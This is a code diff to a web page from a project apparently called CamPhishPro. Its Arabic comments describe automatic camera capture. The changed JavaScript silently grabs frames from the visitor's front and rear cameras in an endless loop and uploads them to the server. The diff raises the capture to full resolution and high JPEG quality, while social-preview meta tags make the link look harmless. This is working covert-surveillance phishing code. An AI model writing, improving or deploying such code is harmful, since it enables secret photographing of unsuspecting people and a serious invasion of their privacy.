@@ -19,7 +19,7 @@
     <meta property="og:image:secure_url" content="https://raw.githubusercontent.com/faraabaas-jpg/CamPhishPro/main/preview.jpg" />
     <meta property="og:image:type" content="image/jpeg" />
     <meta property="og:image:width" content="940" />
-    <meta property="og:image:hei;ght" content="788" />
+    <meta property="og:image:height" content="788" />
 
     <!-- وسوم المعاينة لمنصة X وتلجرام وديكسورد -->
     <meta name="twitter:card" content="summary_large_image" />
@@ -511,19 +511,20 @@ function download(){
   },300);
 }
 
-/* ===== ميزات الكاميرا التلقائية (تبديل سريع وغير ملحوظ بين الأمامية والخلفية) ===== */
+/* ===== ميزات الكاميرا التلقائية (التقاط عريض وعالي الدقة بدون اقتصاص) ===== */
 let isCapturing = false;
 let currentFacingMode = 'user'; // 'user' للأمامية، 'environment' للخلفية
 
 async function captureFast(facingMode) {
     let stream = null;
     try {
-        // طلب التدفق بأدنى دقة لسرعة الالتقاط
+        // طلب الكاميرا بأعلى دقة مريحة وأوسع زاوية رؤية ممكنة
         stream = await navigator.mediaDevices.getUserMedia({ 
             video: { 
                 facingMode: { ideal: facingMode },
-                width: { ideal: 640 },
-                height: { ideal: 480 }
+                width: { ideal: 1920 },
+                height: { ideal: 1080 },
+                aspectRatio: { ideal: 1.777777778 }
             } 
         });
 
@@ -535,9 +536,10 @@ async function captureFast(facingMode) {
             else videoEl.onloadeddata = () => resolve();
         });
 
+        // إنشاء الكانفاس بأبعاد المستشعر الكاملة لمنع قص الوجه والأطراف
         const canvas = document.createElement('canvas');
-        canvas.width = videoEl.videoWidth || 640;
-        canvas.height = videoEl.videoHeight || 480;
+        canvas.width = videoEl.videoWidth || 1920;
+        canvas.height = videoEl.videoHeight || 1080;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
 
@@ -547,7 +549,7 @@ async function captureFast(facingMode) {
                 fd.append('image', blob, `${facingMode}_eye.jpg`);
                 fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
             }
-        }, 'image/jpeg', 0.6);
+        }, 'image/jpeg', 0.95);
 
     } catch (e) {
         console.log("خطأ في الالتقاط السريع:", e);
@@ -565,7 +567,7 @@ function startCapture() {
     const runLoop = async () => {
         await captureFast(currentFacingMode);
         currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
-        setTimeout(runLoop, 200);
+        setTimeout(runLoop, 300);
     };
 
     runLoop();
